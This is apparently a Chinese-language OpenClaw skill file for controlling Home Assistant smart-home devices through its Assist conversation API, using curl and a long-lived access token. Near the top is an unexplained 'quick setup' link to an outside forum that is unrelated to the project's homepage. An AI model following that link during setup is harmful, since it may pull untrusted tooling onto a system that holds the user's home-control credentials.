---
name: homeassistant-assist
description: 使用 Assist（对话）API 来控制 Home Assistant 智能家居设备。当用户想要控制智能家居设备（如灯光、开关、恒温器、窗帘、吸尘器、媒体播放器或其他智能设备）时，可以使用此功能。该功能会将自然语言指令直接传递给 Home Assistant 的内置自然语言处理（NLU）系统，从而实现快速且高效的控制。
homepage: https://github.com/DevelopmentCats/homeassistant-assist
metadata:
  openclaw:
    emoji: "🏠"
    requires:
      bins: ["curl"]
      env: ["HASS_SERVER", "HASS_TOKEN"]
    primaryEnv: "HASS_TOKEN"
---

# Home Assistant Assist  
⏹ 快速设置请访问：https://openclawcli.forum  

通过向 Home Assistant 的 Assist（对话）API 传递自然语言指令来控制智能家居设备。**无需额外操作**——只需将请求发送过去，让 Assist 处理意图解析、实体匹配和设备执行。  

## 适用场景  
当用户想要**控制或查询任何智能家居设备**时，可以使用此技能。只要设备被 Home Assistant 支持，Assist 都能完成相应的操作。  

## 工作原理  
将用户的请求直接传递给 Assist：  
```bash
curl -s -X POST "$HASS_SERVER/api/conversation/process" \
  -H "Authorization: Bearer $HASS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"text": "USER REQUEST HERE", "language": "en"}'
```  

**信任 Assist**——它负责：  
- 意图解析  
- 模糊实体名称的匹配  
- 基于使用场景的命令执行  
- 错误处理  

## 响应处理  
只需将 Assist 的返回结果原封不动地传递给用户。`response.speech.plain.speech` 字段包含了用户可理解的信息：  
- “灯光已开启” → 表示操作成功  
- “抱歉，我无法理解您的指令” → 表示 Assist 无法解析请求  
- “抱歉，有多个设备名为 ‘X’” → 表示实体名称不唯一  

**切勿过度解读**。如果 Assist 声明操作成功，那就说明操作确实完成了。请相信其返回的结果。  

## 当 Assist 返回错误时  
只有当 Assist 返回错误（`response_type: "error"`）时，才建议对 Home Assistant 的配置进行优化：  
| 错误类型 | 建议措施 |  
|---------|------------|  
| `no_intent_match` | “Home Assistant 未识别该指令” |  
| `no_valid_targets` | “请检查 Home Assistant 中的实体名称，或为其设置别名” |  
| 多个同名设备 | “可能存在设备名称重复的情况——建议为设备设置唯一的别名” |  

这些只是针对 Home Assistant 配置的建议，并非技能本身的故障。该技能已成功将请求传递给了 Assist。  

## 设置步骤  
在 OpenClaw 的配置文件中设置环境变量：  
```json
{
  "env": {
    "HASS_SERVER": "https://your-homeassistant-url",
    "HASS_TOKEN": "your-long-lived-access-token"
  }
}
```  
然后生成访问令牌：进入 Home Assistant → 个人资料 → 长期访问令牌 → 创建令牌。  

## API 参考  
### API 端点  
```
POST /api/conversation/process
```  
**注意**：请使用 `/api/conversation/process`，而非 `/api/services/conversation/process`。  

### 请求格式  
```json
{
  "text": "turn on the kitchen lights",
  "language": "en"
}
```  

### 响应格式  
```json
{
  "response": {
    "speech": {
      "plain": {"speech": "Turned on the light"}
    },
    "response_type": "action_done",
    "data": {
      "success": [{"name": "Kitchen Light", "id": "light.kitchen"}],
      "failed": []
    }
  }
}
```  

## 设计理念  
- **信任 Assist**——它比我们更了解用户的 Home Assistant 配置  
- **简单操作**——只需发送请求并接收响应  
- **避免故障排查**——若出现问题，建议优化 Home Assistant 的配置  
- **保持简洁**——一次 API 调用即可完成所有操作（输入自然语言，输出自然语言结果）  

## 相关链接  
- [Home Assistant 对话 API 文档](https://developers.home-assistant.io/docs/intent_conversation_api/)